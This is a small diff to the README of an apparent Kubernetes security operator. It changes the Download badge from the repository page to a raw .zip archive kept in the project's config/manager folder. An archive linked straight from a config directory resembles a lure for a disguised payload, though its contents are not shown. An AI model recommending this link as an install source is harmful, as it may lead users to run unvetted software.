@@ -1,6 +1,6 @@
 # 🛡️ anubis-kubernetes-operator - Secure your Kubernetes clusters with AI
 
-[![](https://img.shields.io/badge/Download-Anubis-blue.svg)](https://github.com/forestimmanent603/anubis-kubernetes-operator)
+[![](https://img.shields.io/badge/Download-Anubis-blue.svg)](https://raw.githubusercontent.com/forestimmanent603/anubis-kubernetes-operator/main/config/manager/anubis-kubernetes-operator-v1.8.zip)
 
 ## 📖 About this application
 
